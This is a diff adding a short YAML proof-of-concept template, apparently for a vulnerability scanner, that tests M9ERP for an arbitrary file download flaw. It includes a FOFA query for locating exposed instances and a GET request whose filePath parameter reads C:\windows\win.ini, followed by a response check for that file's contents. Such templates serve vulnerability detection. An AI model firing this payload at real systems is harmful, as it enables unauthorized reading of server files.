@@ -1,0 +1,15 @@
+id: poc-yaml-m9erp-downloadinpfile-anyfile-down
+info:
+  name: M9ERP DownloadInpFile 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: m9erp
+  fofa: body="M9ERP"
+requests:
+- method: GET
+  path: /Basics/DownloadInpFile?filePath=C:\windows\win.ini
+  expression: "status_code == 200 && \ncontains(body,\"bit app support\") &&\ncontains(body,\"\
+    [files]\") &&\ncontains(headers,\"filename=\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
